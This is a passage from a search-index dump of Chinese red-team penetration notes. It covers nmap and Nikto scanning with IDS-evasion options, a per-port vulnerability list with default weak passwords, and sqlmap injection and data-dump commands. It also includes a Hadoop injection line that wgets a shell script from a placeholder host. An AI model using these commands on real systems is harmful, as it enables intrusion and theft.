\u4f7f\u7528-sC\u6216-A\u9009\u9879\u626b\u63cf\u65f6\u5019\u9ed8\u8ba4\u7684\u811a\u672c\uff0c\u63d0\u4f9b\u57fa\u672c\u811a\u672c\u626b\u63cf\u80fd\u529b discovery: \u5bf9\u7f51\u7edc\u8fdb\u884c\u66f4\u591a\u7684\u4fe1\u606f\uff0c\u5982SMB\u679a\u4e3e\u3001SNMP\u67e5\u8be2\u7b49 dos: \u7528\u4e8e\u8fdb\u884c\u62d2\u7edd\u670d\u52a1\u653b\u51fb exploit: \u5229\u7528\u5df2\u77e5\u7684\u6f0f\u6d1e\u5165\u4fb5\u7cfb\u7edf external: \u5229\u7528\u7b2c\u4e09\u65b9\u7684\u6570\u636e\u5e93\u6216\u8d44\u6e90\uff0c\u4f8b\u5982\u8fdb\u884cwhois\u89e3\u6790 fuzzer: \u6a21\u7cca\u6d4b\u8bd5\u7684\u811a\u672c\uff0c\u53d1\u9001\u5f02\u5e38\u7684\u5305\u5230\u76ee\u6807\u673a\uff0c\u63a2\u6d4b\u51fa\u6f5c\u5728\u6f0f\u6d1e intrusive: \u5165\u4fb5\u6027\u7684\u811a\u672c\uff0c\u6b64\u7c7b\u811a\u672c\u53ef\u80fd\u5f15\u53d1\u5bf9\u65b9\u7684IDS/IPS\u7684\u8bb0\u5f55\u6216\u5c4f\u853d malware: \u63a2\u6d4b\u76ee\u6807\u673a\u662f\u5426\u611f\u67d3\u4e86\u75c5\u6bd2\u3001\u5f00\u542f\u4e86\u540e\u95e8\u7b49\u4fe1\u606f safe: \u6b64\u7c7b\u4e0eintrusive\u76f8\u53cd\uff0c\u5c5e\u4e8e\u5b89\u5168\u6027\u811a\u672c version: \u8d1f\u8d23\u589e\u5f3a\u670d\u52a1\u4e0e\u7248\u672c\u626b\u63cf\uff08Version Detection\uff09\u529f\u80fd\u7684\u811a\u672c vuln: \u8d1f\u8d23\u68c0\u67e5\u76ee\u6807\u673a\u662f\u5426\u6709\u5e38\u89c1\u7684\u6f0f\u6d1e\uff08Vulnerability\uff09\uff0c\u5982\u662f\u5426\u6709MS08_067 \uff081\uff09 nmap --script=auth 192.168.137.* \u8d1f\u8d23\u5904\u7406\u9274\u6743\u8bc1\u4e66\uff08\u7ed5\u5f00\u9274\u6743\uff09\u7684\u811a\u672c,\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u68c0\u6d4b\u90e8\u5206\u5e94\u7528\u5f31\u53e3\u4ee4 \uff082\uff09nmap --script=brute 192.168.137.* \u63d0\u4f9b\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f \u53ef\u5bf9\u6570\u636e\u5e93\uff0csmb\uff0csnmp\u7b49\u8fdb\u884c\u7b80\u5355\u5bc6\u7801\u7684\u66b4\u529b\u731c\u89e3 \uff083\uff09nmap --script=default 192.168.137.* \u6216\u8005 nmap -sC 192.168.137.* \u9ed8\u8ba4\u7684\u811a\u672c\u626b\u63cf\uff0c\u4e3b\u8981\u662f\u641c\u96c6\u5404\u79cd\u5e94\u7528\u670d\u52a1\u7684\u4fe1\u606f\uff0c\u6536\u96c6\u5230\u540e\uff0c\u53ef\u518d\u9488\u5bf9\u5177\u4f53\u670d\u52a1\u8fdb\u884c\u653b\u51fb \uff084\uff09nmap --script=vuln 192.168.137.* \u68c0\u67e5\u662f\u5426\u5b58\u5728\u5e38\u89c1\u6f0f\u6d1e \uff085\uff09nmap -n -p445 --script=broadcast 192.168.137.4 \u5728\u5c40\u57df\u7f51\u5185\u63a2\u67e5\u66f4\u591a\u670d\u52a1\u5f00\u542f\u72b6\u51b5 \uff086\uff09nmap --script external 202.103.243.110 \u5229\u7528\u7b2c\u4e09\u65b9\u7684\u6570\u636e\u5e93\u6216\u8d44\u6e90\uff0c\u4f8b\u5982\u8fdb\u884cwhois\u89e3\u6790 nmap --script banner ip nmap -p port -sV ip \u83b7\u53d6\u8f6f\u4ef6\u7248\u672c\u4fe1\u606f nmap -O ip \u64cd\u4f5c\u7cfb\u7edf\u4fe1\u606f\uff0c\u7248\u672c nmap -A -v ip \u5b8c\u6574\u4fe1\u606f\u83b7\u53d6 -sN;-sF;-sX \u9690\u853d\u626b\u63cf -sN\u662fNull\u626b\u63cf,\u662f\u901a\u8fc7\u53d1\u9001\u975e\u5e38\u89c4\u7684TCP\u901a\u4fe1\u6570\u636e\u5305\u5bf9\u8ba1\u7b97\u673a\u8fdb\u884c\u63a2\u6d4b. nmap -sN 127.0.0.1 -sF\u662fFIN\u626b\u63cf,\u5f53\u6211\u4eec\u4f7f\u7528TCP SYN\u626b\u63cf\u65f6\u53ef\u80fd\u4f1a\u88ab\u76ee\u6807\u4e3b\u673a\u7684\u9632\u706b\u5899\u53d1\u73b0,\u4f1a\u963b\u6b62SYN\u6570\u636e\u5305,\u8fd9\u65f6\u6211\u4eec\u4f7f\u7528TCP FIN\u626b\u63cf\u65b9\u5f0f\u4f1a\u6709\u5f88\u597d\u7684\u7a7f\u900f\u6548\u679c. nmap -sF 127.0.0.1 \u626b\u63cf\u524d1000\u53f7TCP\u7aef\u53e3 nmap 192.168.100.2 Ping\u626b\u63cf8\u4e2a\u672c\u5730\u4e3b\u673a(\u6309ARP\u3001ICMP\u3001TCP 80\u7684\u987a\u5e8f) nmap \u2013sP 192.168.100.0-7 \u626b\u63cf80,443\u7aef\u53e3 nmap -p 80,443 192.168.100.2 \u626b\u63cf\u524d1000\u53f7TCP\u7aef\u53e3\uff0cOS\u6307\u7eb9\uff0c\u670d\u52a1\uff0c\u7136\u540e\u8fd0\u884c\u4e00\u4e2aNSE\u811a\u672c sudo nmap -A 192.168.100.2 \u626b\u63cf\u5168\u90e865535\u4e2aTCP\u7aef\u53e3\uff0cOS\u6307\u7eb9\uff0c\u670d\u52a1\uff0c\u7136\u540e\u8fd0\u884c\u4e00\u4e2aNSE\u811a\u672c sudo nmap \u2013A \u2013p- 192.168.100.2 \u626b\u63cf\u524d1000\u53f7UDP\u7aef\u53e3 sudo nmap -sU 192.168.100.2 \u626b\u63cf\u6240\u670965535\u4e2aUDP\u7aef\u53e3 sudo nmap -sU \u2013p- 192.168.100.2 \u626b\u63cf\u6240\u670965535\u4e2aUDP\u7aef\u53e3\uff0c\u5e76\u83b7\u53d6\u670d\u52a1\u3001OS\u6307\u7eb9\uff0c\u4e4b\u540e\u8fd0\u884c\u4e00\u4e9bNSE\u811a\u672c sudo nmap \u2013sU -p- -A 192.168.100.2 nmap\u8111\u56fe\u5907\u67e5:","title":"1.1\u5e38\u89c1\u670d\u52a1\u6f0f\u6d1e:"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#12","text":"\u5e38\u89c1\u7aef\u53e3\u6e17\u900f\u603b\u7ed3 - \u621a\u6e90 - \u535a\u5ba2\u56ed Masscan -p80,800 ip --rate=10000 \u8bc6\u522b\u7aef\u53e3\u540e\uff0c\u767e\u5ea6\u8c37\u6b4c\u76f8\u5e94\u7aef\u53e3\u653b\u51fb\u529e\u6cd5\uff08\u7aef\u53e3\u6e17\u900f\u603b\u7ed3\uff0c\u53ef\u89c1\u7b14\u8bb0\uff09 21 / FTP \uf0b7\u533f\u540d/\u66b4\u529b\u7834\u89e3 \uf0b7\u62d2\u7edd\u670d\u52a1 22 / SSH \uf0b7\u66b4\u529b\u7834\u89e3 23 / telnet \uf0b7Winbox(CVE-2018-14847) https://github.com/BasuCert/WinboxPoC \uf0b7\u5f31\u53e3\u4ee4 / \u66b4\u529b\u7834\u89e3 161 / snmp \uf0b7\u5f31\u53e3\u4ee4 https://blog.csdn.net/archersaber39/article/details/78932252 389 / ladp \uf0b7\u533f\u540d\u8bbf\u95ee https://www.cnblogs.com/persuit/p/5706432.html \uf0b7ladp\u6ce8\u5165 http://www.4hou.com/technology/9090.html https://www.freebuf.com/articles/web/149059.html 443 / ssl \uf0b7openssl\u5fc3\u810f\u51fa\u8840 https://paper.seebug.org/437/http://www.anquan.us/static/drops/papers-1381.htmlhttps://www.freebuf.com/sectool/33191.html 445 / smb \uf0b7win10\u62d2\u7edd\u670d\u52a1 \uf0b7\u6c38\u6052\u4e4b\u84ddRCE 875 / rsync \uf0b7\u533f\u540d\u8bbf\u95ee http://www.anquan.us/static/bugs/wooyun-2016-0190815.htmlhttps://paper.seebug.org/409/http://www.91ri.org/11093.html 1433 / mssql \uf0b7\u66b4\u529b\u7834\u89e3 http://www.anquan.us/static/drops/tips-12749.htmlhttps://www.seebug.org/appdir/Microsoft%20SQL%20Server 1521 / oracle \uf0b7\u66b4\u529b\u7834\u89e3 https://www.exploit-db.com/exploits/33084 2601 / zebra \uf0b7 http://www.anquan.us/static/bugs/wooyun-2013-047409.html 3128 / squid 3306 / mysql \uf0b7RCE http://www.91ri.org/17511.html CVE-2015-0411 \uf0b7hash\u7834\u89e3 https://www.freebuf.com/column/153561.html \uf0b7waf\u7ed5\u8fc7 https://www.freebuf.com/articles/web/155570.html \uf0b7general_log_file getshell https://www.freebuf.com/column/143125.html \uf0b7\u63d0\u6743 http://www.91ri.org/16540.html 3312 / kangle \uf0b7getshell https://www.secpulse.com/archives/23927.html 3389 / rdp \uf0b7shift \u653e\u5927\u955c \u8f93\u5165\u6cd5\u7ed5\u8fc7 guest\u7528\u6237 \uf0b7\u6c38\u6052\u4e4b\u84dd(ESTEEMAUDIT) https://www.freebuf.com/articles/system/132171.htmlhttps://www.anquanke.com/post/id/86328 \uf0b7ms12-020 https://blog.csdn.net/meyo_leo/article/details/77950552 4440 / rundeck \uf0b7 https://www.secpulse.com/archives/29500.html 4848 / glassfish \uf0b7\u6587\u4ef6\u8bfb\u53d6 https://www.secpulse.com/archives/42277.html https://www.anquanke.com/post/id/85948 \uf0b7GlassFish2 / admin:admin GlassFish3,4 / \u5982\u679c\u7ba1\u7406\u5458\u4e0d\u8bbe\u7f6e\u5e10\u53f7\u672c\u5730\u4f1a\u81ea\u52a8\u767b\u5f55,\u8fdc\u7a0b\u8bbf\u95ee\u4f1a\u63d0\u793a\u914d\u7f6e\u9519\u8bef 5432 / PostgreSQL \uf0b7RCE https://www.cnblogs.com/KevinGeorge/p/8521496.html https://www.secpulse.com/archives/69153.html \uf0b7\u9ed8\u8ba4\u8d26\u53f7postgres \uf0b7\u53c2\u8003 http://www.91ri.org/13070.html http://www.91ri.org/6507.html 5672,15672,4369,25672 / RabbitMQ \uf0b7\uff08guest/guest\uff09 5900 / VNC \uf0b7 https://www.seebug.org/appdir/RealVNC 5984 / CouchDB \uf0b7 http://xxx:5984/_utils/ 6082 / varnish \uf0b7CLI \u672a\u6388\u6743 https://www.secpulse.com/archives/10681.html 6379 / redis \uf0b7Redis\u672a\u6388\u6743 ssh publickey crontab webshell \u53cd\u5e8f\u5217\u5316 \u5f00\u673a\u81ea\u542f\u6587\u4ef6\u5939\u5199bat \uf0b7\u53c2\u8003 https://www.freebuf.com/column/170710.html 7001,7002 / WebLogic \uf0b7\u9ed8\u8ba4\u5f31\u53e3\u4ee4 weblogic/weblogic ,weblogic/welcom ,weblogic/welcom1,weblogic1/weblogic \uf0b7\u53cd\u5e8f\u5217 CVE-2018-2628 https://www.freebuf.com/articles/web/169770.html https://www.seebug.org/appdir/WebLogic 9200,9300 / elasticsearch \uf0b7CVE-2015-1427 http://www.anquan.us/static/drops/papers-5142.html \uf0b7CVE-2018-17246 https://www.seebug.org/vuldb/ssvid-97730 \uf0b7\u53c2\u8003 https://www.seebug.org/search/?keywords=elasticsearch 9000 / fcgi \uf0b7 https://paper.seebug.org/289/ 9043 / WebSphere \uf0b7Websphere8.5 https://localhost:9043/ibm/console/logon.jsp \uf0b7Websphere6-7 http://localhost:9043/ibm/console \uf0b7\u540e\u53f0\u672a\u6388\u6743\uff0c\u767b\u5f55\u540e\u53ef\u90e8\u7f72WAR\u5305 \uf0b7SOAP\u670d\u52a1\u6709\u53cd\u5e8f\u5217\u5316 \uf0b7\u5f31\u53e3\u4ee4\uff1aadmin / password 11211 / memcache \uf0b7\u672a\u6388\u6743 \uf0b7UDP\u53cd\u5c04 https://shockerli.net/post/memcached-udp-reflection-attack-bug/ 27017,27018 / Mongodb \uf0b7\u672a\u6388\u6743 \uf0b7\u6ce8\u5165 https://www.anquanke.com/post/id/83763 \uf0b7phpMoAdmin RCE https://www.aqniu.com/threat-alert/6978.html 50000 / SAP \uf0b7 SAP\u547d\u4ee4\u6267\u884c https://www.secpulse.com/archives/20204.html 50070,50030 / hadoop \uf0b7\u672a\u6388\u6743 https://www.freebuf.com/vuls/173638.html \uf0b7\u547d\u4ee4\u6267\u884c host:50060/pstack?pid=123|wget http://somehost/shell.sh https://www.seebug.org/search/?keywords=hadoop \u5176\u4ed6 \uf0b7 http://www.91ri.org/15441.html","title":"1.2\u5e38\u89c1\u7aef\u53e3\u6f0f\u6d1e:"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#13wafbypass","text":"\u63a2\u6d4bWAF Nmap\u63a2\u6d4bWAF\u6709\u4e24\u79cd\u811a\u672c\uff0c\u4e00\u79cd\u662fhttp-waf-detect\uff0c\u4e00\u79cd\u662fhttp-waf-fingerprint\u3002 nmap -p port --script=http-waf-detect ip wafw00f -a example.com sqlmap-u \u201c http://www.vxxxx.org/ex.php?id=1 \u201d --identify-waf bypass: \u5f85\u8865\u5145","title":"1.3WAF\u53cabypass"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#14_1","text":"\u5fa1\u5251\u76ee\u5f55\uff08\u571f\u53f8\u4e13\u7248\uff0c\u7b14\u8bb0\u91cc\u6709\uff09\u3001\u540e\u53f0\u626b\u63cf\uff08\u56fe\u7247\u5c5e\u6027\u5730\u5740\u66b4\u9732\uff09\uff0c \u200b \u5b8c\u5584\u76ee\u5f55\u548c\u8d26\u5bc6\u5b57\u5178\u65b9\u6cd5\uff1a \u200b { \u200b H:\\\u5b57\u5178\uff1b \u200b pydictor\u65b0\u5efa\uff1b \u200b \u5408\u5e76\u540e\u53bb\u91cd\u590d\uff1a \u200b dymerge.py -u \u200b python pydictor.py -tool uniqbiner /my/dict/dirpath --output uniq.txt \u200b python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt \u200b } 2.\u4eba\u5de5\u6d4f\u89c8\\\u4e00\u4e2a\u8bf7\u6c42\u4e00\u4e2a\u8bf7\u6c42\u7684burp **\u975e\u5e38**\u91cd\u8981,\u6709\u5fc5\u8981\u624b\u52a8\u53bb\u6d4f\u89c8\u6bcf\u4e2a\u9875\u9762\uff0c\u70b9\u51fb\u9875\u9762\u4e0a\u6bcf\u4e00\u4e2a\u8df3\u8f6c\uff0c\u8fd9\u6837\u5728Burp\u7684sitemap\u91cc\u9762\u5c31\u53ef\u4ee5\u51fa\u73b0\u8fd9\u4e9b\u8bf7\u6c42\u548c\u54cd\u5e94\u3002 \uff01\uff01\uff01\u624b\u5de5\u6d4f\u89c8\u5bf9\u4e8e\u5355\u9875\u5e94\u7528\u975e\u5e38\u975e\u5e38\u91cd\u8981\u3002\u81ea\u52a8\u5316\u7684\u7f51\u9875\u722c\u866b\u4e0d\u80fd\u591f\u722c\u5230\u5355\u9875\u5e94\u7528\u56e0\u4e3a\u5355\u9875\u5e94\u7528\u7684HTTP\u8bf7\u6c42\u90fd\u662f\u7528\u5f02\u6b65\u7684AJAX\u6765\u8fdb\u884c\u7684\u3002 \u56fe\u7247\u540e\u53f0\u5730\u5740\\\u56fe\u7247\u540e\u9762\u7684\u4fe1\u606f \u8df3\u8f6c\u53c2\u6570\\\u5947\u602a\u7684\u53c2\u6570 \u6cc4\u9732\u90ae\u7bb1\u7b49\u7b49 \u4e1a\u52a1\u903b\u8f91\\\u67b6\u6784 3.\u81ea\u52a8\u5316 \u81ea\u52a8\u5316\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6:( \u5f85\u8865\u5145 ) Sn1per Ary Ary\u81ea\u52a8\u6e17\u900f\u4f7f\u7528\u4f53\u9a8c \u200b","title":"1.4****\u76ee\u5f55\u3001\u540e\u53f0\u548c\u654f\u611f\u8def\u5f84\u6587\u4ef6\u626b\u63cf"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#0x03","text":"","title":"0x03 \u6f0f\u6d1e\u6316\u6398"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#1_2","text":"\u6ce8\u610f:\u767b\u5f55\u7c7b\u7f51\u7ad9\u626b\u63cf\u8981\u5e26cookies\u626b\u624d\u80fd\u626b\u5230","title":"1.\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#11nikto-web","text":"Tips:\u5229\u7528-Format\u9009\u9879\u6765\u5bfc\u51fa\u7279\u5b9a\u683c\u5f0f\u7684\u626b\u63cf\u7ed3\u679c\uff0c\u4f7f\u626b\u63cf\u7ed3\u679c\u66f4\u5bb9\u6613\u9605\u8bfb\u548c\u5206\u6790\u3002 nikto -host http://example.com -output ~/nikto.html -Format html NIKTO\u4f7f\u7528\u65b9\u6cd5\uff1a 1\u3001\u547d\u4ee4\uff1anikto -update #\u5347\u7ea7\uff0c\u66f4\u65b0\u63d2\u4ef6\uff1b 2\u3001Nikto -list-plugins #\u67e5\u770b\u63d2\u4ef6\uff1b 3\u3001Nikto -host http://1.1.1.1 #\u626b\u63cf\u76ee\u6807\uff1a\u57df\u540d\u65b9\u5f0f\uff1b 4\u3001Nikto -host http://1.1.1.1 -output #\u626b\u63cf\u5e76\u8f93\u51fa\u7ed3\u679c 5\u3001Nikto -host 1.1.1.1 -port 80 #\u626b\u63cf\u76ee\u6807\uff1aip\u5730\u5740\u52a0\u7aef\u53e3\u53f7 6\u3001Nikto -host www.baidu.com -port 443 -ssl #\u626b\u63cfhttps\u7f51\u7ad9 7\u3001Nikto -host \u6587\u4ef6\u540d.txt #\u6279\u91cf\u626b\u63cf\u76ee\u6807 8\u3001nmap -p80 192.168.1.0/24 -oG - | nikto -host - #\u5229\u7528nmap\u626b\u63cf\u5f00\u653e80\u7aef\u53e3\u7684IP\u6bb5\u5e76\u4e14oG\uff08nmap\u7ed3\u679c\u8f93\u51fa\u5e76\u6574\u7406\uff09\u901a\u8fc7\u7ba1\u9053\u7684\u65b9\u5f0f\u201c|\u201d\u7528nikto\u8fdb\u884c\u626b\u63cf 9\u3001nikto -host 192.168.0.1 -useproxy http://localhost:8070 #\u5229\u7528\u4ee3\u7406\u8fdb\u884c\u626b\u63cf 10\u3001-vhost #\u5f53\u4e00\u4e2a\u7f51\u7ad9\u5b58\u5728\u591a\u4e2a\u7aef\u53e3\u65f6\u53ef\u4ee5\u4f7f\u7528-vhost\u904d\u5386\u6240\u6709\u7f51\u7ad9\u8fdb\u884c\u626b\u63cf\u6216\u4e00\u4e2aip\u5bf9\u5e94\u591a\u4e2a\u7f51\u7ad9 11\u3001Nikto\u4ea4\u4e92\u5f62\u53c2\u6570\uff1a \u7a7a\u683c \u62a5\u544a\u5f53\u524d\u626b\u63cf\u72b6\u6001 v \u663e\u793a\u8be6\u7ec6\u4fe1\u606f\uff08verbose\uff09 d \u8c03\u8bd5\u4fe1\u606f\uff08\u53ca\u5176\u8be6\u7ec6\u4fe1\u606f\uff09 e \u663e\u793a\u9519\u8bef\u4fe1\u606f p \u663e\u793a\u626b\u63cf\u8fdb\u5ea6 r \u663e\u793a\u91cd\u5b9a\u5411\u4fe1\u606f c \u663e\u793acookie a \u8eab\u4efd\u8ba4\u8bc1\u8fc7\u7a0b\u663e\u793a\u51fa\u6765 q \u9000\u51fa N \u626b\u63cf\u4e0b\u4e00\u4e2a\u76ee\u6807 P \u6682\u505c\u626b\u63cf \u914d\u7f6e\u6587\u4ef6\uff1a \u8def\u5f84\uff1a/etc/nikto.conf User Agent\u4e2d\u6587\u540d\u4e3a\u7528\u6237\u4ee3\u7406\uff0c\u7b80\u79f0 UA\uff0c\u5b83\u662f\u4e00\u4e2a\u7279\u6b8a\u5b57\u7b26\u4e32\u5934\uff0c\u4f7f\u5f97\u670d\u52a1\u5668\u80fd\u591f\u8bc6\u522b\u5ba2\u6237\u4f7f\u7528\u7684\u64cd\u4f5c\u7cfb\u7edf\u53ca\u7248\u672c\uff1b \u5728nikto\u4e2d\u6700\u597d\u4fee\u6539\u6210\u522b\u7684\u6d4f\u89c8\u5668user agent\uff1b \u8bbe\u7f6ecookie\uff1a \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u627e\u5230cookie\u8fdb\u884c\u8bbe\u7f6e\uff08#STATIC-COOKIE= \"cookie1\"=\"cookie value\";\"cookie2\"=\"cookie val\"\uff09 IDS\u9003\u907f\u6280\u672f\uff1a\u2018 \u4e3b\u8981\u4e3a\u4e86\u8eb2\u907fIDS\u3001IPS\u68c0\u6d4b\u544a\u8b66 -evasion #\u6b64\u53c2\u6570\u4f7f\u7528\u65b9\u5f0f\uff08Nikto -host http://1.1.1.1 -evasion 1234\uff09 \u9003\u907f\u65b9\u5f0f\u51718\u79cd\uff1a 1\u3001\u968f\u673aurl\u7f16\u7801\uff0c2\u3001\u81ea\u9009\u8def\u5f84\uff0c3\u3001\u8fc7\u65e9\u7ed3\u675f\u7684URL\uff0c4\u3001\u4f18\u5148\u8003\u8651\u957f\u968f\u673a\u5b57\u7b26\u4e32 5\u3001\u53c2\u6570\u6b3a\u9a97\uff0c6\u3001\u4f7f\u7528TAB\u4f5c\u4e3a\u547d\u4ee4\u7684\u5206\u9694\u7b26\uff0c7\u3001\u4f7f\u7528\u53d8\u5316\u7684URL\uff0c8\u3001\u4f7f\u7528Windows\u8def\u5f84\u5206\u9694\u7b26","title":"1.1Nikto Web\u670d\u52a1\u6f0f\u6d1e\u626b\u63cf\u5668"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#12awvs","text":"\u8fd9\u4e2a\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u7834\u89e3\u7248\u5230\u5904\u90fd\u662f\u3002","title":"1.2****AWVS\u6f0f\u626b"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#13nessus","text":"\u5b9e\u65f6\u66f4\u65b0\u63d2\u4ef6\u7684\u6f0f\u626b\uff0c\u5f88\u597d\u7528\uff0c\u5c31\u662f\u6fc0\u6d3b\u6d41\u7a0b\u9ebb\u70e6\u3002 \u7834\u89e3\u6d41\u7a0b\uff1a","title":"1.3NESSUS"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#14xray","text":"\u81ea\u52a8\u5316\u7684\u6f0f\u6d1e\u6316\u6398 burp+xray\uff1a BurpSuite + Xray \u88ab\u52a8\u626b\u63cf\u914d\u7f6e - Ritte - \u535a\u5ba2\u56ed \u6216\u8005\u76f4\u63a5\u6302\u6d4f\u89c8\u5668\uff0c\u70b9\u5230\u54ea\u91cc\uff0c\u626b\u5230\u54ea\u91cc","title":"1.4Xray\u81ea\u52a8\u5316"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#15fuzz","text":"\u540d \u79f0 \u63cf\u8ff0 Burp Engagement Tools Burp Suite Pro\u4e2d\u81ea\u5e26\u7684\u6709\u7279\u6b8a\u7528\u9014\u7684\u5de5\u5177\u96c6 Engagement Tool: Discover Content Burp Suite Pro\u81ea\u5e26\u7684\u7528\u4e8e\u5f3a\u5236\u6d4f\u89c8\u7684\u5de5\u5177 Burp Intruder Burp Suite\u4e2d\u53ef\u81ea\u5b9a\u4e49\u7684\u7528\u4e8e\u81ea\u52a8\u5316\u7684\u653b\u51fb\u7684\u6a21\u5757\u3002(\u6bd4\u5982brute forcing, injection\u7b49) FuzzDB \u5305\u542b\u5404\u79cd\u6076\u610f\u8f93\u5165\u3001\u8d44\u6e90\u540d\u3001\u7528\u4e8egrep\u641c\u7d22\u54cd\u5e94\u5185\u5bb9\u7684\u5b57\u7b26\u4e32\u3001Webshell\u7b49\u3002 Fuzz\u53ef\u4ee5\u53d1\u73b0\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6ca1\u6709\u88ab\u5f15\u7528\u4f46\u662f\u786e\u5b9e\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u9875\u9762\u3002 Discover Content\u662fBurp\u4e2d\u4e13\u95e8\u7528\u4e8e\u6b64\u76ee\u7684\u7684\u5de5\u5177\u3002 \u9664\u6b64\u4e4b\u5916\uff0cBurp Intruder\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5b57\u5178\u653b\u51fb\u6765\u5b9e\u65bd\u5f3a\u5236\u6d4f\u89c8(\u901a\u5e38\u662f\u5728url\u53c2\u6570\u548c\u6587\u4ef6\u8def\u5f84\u90e8\u5206\u8fdb\u884c\u4fee\u6539)\u3002 FuzzDB\u5305\u542b\u4e00\u4e9b\u7528\u4e8e\u6b64\u76ee\u7684\u7684\u975e\u5e38\u725b\u903c\u7684\u5b57\u5178\uff0c\u53ef\u4ee5\u5728 \u8fd9\u91cc \u770b\u770b\u3002","title":"1.5Fuzz"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#_2","text":"","title":""},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#2","text":"","title":"2.\u624b\u52a8\u6316\u6398"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#21sql","text":"\u521d\u6b65\u6d4b\u8bd5\uff1a \u89c1\u6846\u5c31\u4e0a\uff0c\u52a0' \" ) ))% and 1=1 and 1=2\uff0c \u6293\u5305\u7206\u7834\u5e38\u7528SQL\u6ce8\u5165payload \u901a\u8fc7\u641c\u7d22\u5f15\u64ce\uff0c\u6279\u91cf\u67e5\u627e\u6ce8\u5165\u70b9\uff0c\u8be6\u89c1\u7b14\u8bb0\u3002 \u7136\u540e\u7528\u5080\u5121\u6ce8\u5165\u70b9\u6279\u91cf\u641c\u96c6\u5de5\u5177 \u5b9e\u64cd\u6848\u4f8b\uff1a sql\u6ce8\u5165\u601d\u8def\uff08\u767b\u5f55\u754c\u9762\uff09\u548c\u7f51\u7edc\u5e38\u7528\u7aef\u53e3_u011975363\u7684\u4e13\u680f-CSDN\u535a\u5ba2 \u200b \u8d85\u7ea7SQL\u6ce8\u5165\u5de5\u5177\uff08github\uff09 sqlmap\u4e00\u628a\u68ad\uff1a \u6ce8\u610f\uff1a\u547d\u4ee4\u4e3akali linux\u4e2d\u8fd0\u884c\u7684 \uff08windows\u4e2d\u7528python sqlmap.py\u6267\u884c\uff09","title":"2.1SQL\u6ce8\u5165\uff1a"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#1_3","text":"1.sqlmap -u \" http://www.xx.com?id=x \" \u3010\u67e5\u8be2\u662f\u5426\u5b58\u5728\u6ce8\u5165\u70b9 2.--dbs \u3010\u68c0\u6d4b\u7ad9\u70b9\u5305\u542b\u54ea\u4e9b\u6570\u636e\u5e93 3.--current-db \u3010\u83b7\u53d6\u5f53\u524d\u7684\u6570\u636e\u5e93\u540d 4.--tables -D \"db_name\" \u3010\u83b7\u53d6\u6307\u5b9a\u6570\u636e\u5e93\u4e2d\u7684\u8868\u540d -D\u540e\u63a5\u6307\u5b9a\u7684\u6570\u636e\u5e93\u540d\u79f0 5.--columns -T \"table_name\" -D \"db_name\" \u3010\u83b7\u53d6\u6570\u636e\u5e93\u8868\u4e2d\u7684\u5b57\u6bb5 6.--dump -C \"columns_name\" -T \"table_name\" -D \"db_name\" \u3010\u83b7\u53d6\u5b57\u6bb5\u7684\u6570\u636e\u5185\u5bb9","title":"1#\u3001\u6ce8\u5165\u516d\u8fde\uff1a"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#2cookie","text":"sqlmap -u \" http://www.xx.com /xxx.asp\" --cookie \"id=XXX cookie\" --level 2 \u3010cookie\u6ce8\u5165 \u540e\u63a5cookie\u503c","title":"2#\u3001COOKIE\u6ce8\u5165\uff1a"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#3post","text":"\uff081\uff09\u76ee\u6807\u5730\u5740http:// www.xxx.com /login.asp \uff082\uff09\u6253\u5f00burp\u4ee3\u7406 \uff083\uff09\u70b9\u51fb\u8868\u5355\u63d0\u4ea4 \uff084\uff09burp\u83b7\u53d6\u62e6\u622a\u4fe1\u606f\uff08post\uff09 \uff085\uff09\u53f3\u952e\u4fdd\u5b58\u6587\u4ef6\uff08.txt\uff09\u5230\u6307\u5b9a\u76ee\u5f55\u4e0b \uff086\uff09\u8fd0\u884csqlmap\u5e76\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a \u7528\u4f8b\uff1asqlmap -r okay.txt -p username // 